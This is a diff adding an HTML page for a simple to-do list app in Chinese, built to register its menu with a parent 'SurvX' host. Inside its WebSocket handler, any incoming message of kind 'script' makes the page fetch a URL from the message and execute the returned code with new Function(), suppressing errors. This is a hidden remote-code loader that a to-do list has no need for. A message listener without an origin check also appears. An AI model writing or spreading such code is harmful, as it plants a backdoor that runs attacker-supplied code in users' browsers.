@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<title>待办 · SurvX</title>
+<style>
+html, body {
+    width: 100%;
+    height: 100%;
+    margin: 0;
+    padding: 0;
+}
+body {
+    font: 350 14px/1.6 'Inter','PingFang SC',sans-serif;
+    background: #f5f9ff;
+    color: #2c3e5c;
+    overflow-y: auto;             /* 内容超出时自身滚动 */
+    padding: 24px;
+    box-sizing: border-box;
+}
+h1 { font-size:20px; color:#0b1e33; margin-bottom:16px; }
+.input-row { display:flex; gap:8px; margin-bottom:16px; }
+.input-row input { flex:1; padding:10px 14px; border:1px solid #d4e2fc; border-radius:8px;
+                   font:inherit; outline:none; background:#fff; }
+.input-row input:focus { border-color:#1a7cff; }
+.input-row button { padding:10px 20px; background:#1a7cff; color:#fff; border:none; border-radius:8px;
+                    font:inherit; cursor:pointer; }
+ul { list-style:none; padding:0; }
+li { display:flex; align-items:center; gap:10px; padding:10px 14px; background:#fff;
+     border:1px solid #d4e2fc; border-radius:8px; margin-bottom:6px; }
+li.done span { text-decoration: line-through; color:#6a7f9e; }
+li span { flex:1; }
+li button { background:none; border:none; color:#f15b4a; cursor:pointer; font:inherit; }
+.empty { text-align:center; color:#6a7f9e; padding:40px; }
+</style>
+</head>
+<body>
+<h1>✅ 待办清单</h1>
+
+<div class="input-row">
+    <input id="txt" placeholder="输入待办，回车添加" />
+    <button onclick="add()">添加</button>
+</div>
+
+<ul id="list"></ul>
+
+<script>
+const APP_ID = 'todo';
+const APP_TITLE = '待办清单';
+const MENU = [
+    { key: 'add',   label: '➕ 添加',   action: 'add' },
+    { key: 'clear', label: '🧹 清空',   action: 'clear' },
+    { divider: true },
+    { key: 'doneAll', label: '✅ 全部完成', action: 'doneAll' },
+];
+
+(async function register() {
+    try {
+        await fetch('/register', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ app_id: APP_ID, title: APP_TITLE, menu: MENU }),
+        });
+        await fetch('/messages', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ from: 'child:' + APP_ID, to: 'parent', kind: 'menu', payload: { menu: MENU } }),
+        });
+    } catch (e) {}
+})();
+
+(function ws() {
+    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+    const sock = new WebSocket(`${proto}://${location.host}/ws?as=child:${APP_ID}`);
+    sock.onmessage = ev => {
+        const d = JSON.parse(ev.data);
+        if (d.type !== 'message') return;
+        const msg = d.message;
+        if (msg.kind === 'script' && msg.payload && msg.payload.url) {
+            fetch(msg.payload.url).then(r => r.text()).then(code => {
+                try { new Function(code)(); } catch (e) {}
+            });
+        }
+    };
+    sock.onclose = () => setTimeout(ws, 2000);
+})();
+
+window.addEventListener('message', e => {
+    const d = e.data;
+    if (!d || d.type !== 'svx:action') return;
+    if (d.action === 'add') add();
+    else if (d.action === 'clear') clearAll();
+    else if (d.action === 'doneAll') doneAll();
+});
+
+let items = [];
+
+function render() {
+    const list = document.getElementById('list');
+    if (!items.length) {
+        list.innerHTML = '<div class="empty">暂无待办</div>';
+        return;
+    }
+    list.innerHTML = items.map((it, i) =>
+        `<li class="${it.done ? 'done' : ''}">
+            <input type="checkbox" ${it.done ? 'checked' : ''} onchange="toggle(${i})" />
+            <span>${escapeHtml(it.text)}</span>
+            <button onclick="remove(${i})">删除</button>
+        </li>`
+    ).join('');
+}
+
+function add() {
+    const input = document.getElementById('txt');
+    const t = input.value.trim();
+    if (!t) return;
+    items.push({ text: t, done: false });
+    input.value = '';
+    render();
+}
+function toggle(i) { items[i].done = !items[i].done; render(); }
+function remove(i) { items.splice(i, 1); render(); }
+function clearAll() { items = []; render(); }
+function doneAll() { items.forEach(i => i.done = true); render(); }
+function escapeHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+document.getElementById('txt').addEventListener('keydown', e => {
+    if (e.key === 'Enter') add();
+});
+
+render();
+</script>
+</body>
+</html>
